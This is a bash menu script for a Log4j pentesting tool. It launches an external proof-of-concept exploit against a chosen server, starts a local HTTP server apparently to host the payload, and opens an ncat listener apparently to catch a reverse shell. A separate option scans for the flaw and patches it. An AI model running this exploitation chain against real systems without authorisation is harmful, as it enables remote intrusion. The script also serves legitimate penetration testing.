clear
toilet -kf script Log4j Pentester
bold=$(tput bold);
echo "${bold}Developed by >> Sachin Verlekar"
echo "${bold}Github >> https://github.com/TheInterception/Log4J-Simulation-Tool"
echo "${bold}Instagram >> https://www.instagram.com/the_int3rceptor.exe/"
echo ""
echo "=======================================================================";
echo "                               ${bold}MAIN MENU"
echo "=======================================================================";
echo "";
echo "1 >>> Perform a LOG4J Pentesting";
echo "2 >>> Setup localhost"
echo "3 >>> Setup NCAT listener"
echo "4 >>> Quick detect vulnerability on Java application";
echo "5 >>> Exit Script";
echo "";
echo "Choose your option:"
read option
case $option in
1)
  echo "[+] Enter the URL/IP address of your server"
  read url
  echo "[+] Enter the PORT number of your server"
  read webport
  echo "[+] Enter local response listener port number"
  read lport
  python3 poc.py --userip $url --webport $webport --lport $lport
;;
2)
  echo "----- CONFIGURE LOCAL SERVER -----"
  echo "[+] Enter the port number for your local server"
  read localport
  echo "[!] Open new terminal rerun the tool and setup NCAT listener"
  python3 -m http.server $localport
;;
3)
  echo "-----CONFIGURE NCAT LISTENER-----"
  echo "[+] Enter the port number for your NCAT listener"
  read ncatport
  echo "[!] Open new terminal rerun the tool and select perform log4j pentesting "
  ncat -p $ncatport -l -v
;;
4)
  echo "[+] Specify the directory for vulnerability detection"
  read directory
  ./log4j2-scan $directory
  echo "[?] Apply patch (y/n) [Choose n if no vulnerabilities are detected]"
  read subopt
  case $subopt in
  y) ./log4j2-scan --fix --scan-log4j1 --scan-logback --scan-zip $directory
     echo "[?] Rerun the script (y/n)"
     read runscript
     case $runscript in
     	y)./automation.sh
     	;;
     	n)exit
     esac
  ;;
  n) ./automation.sh
esac
;;
5)exit
;;
esac
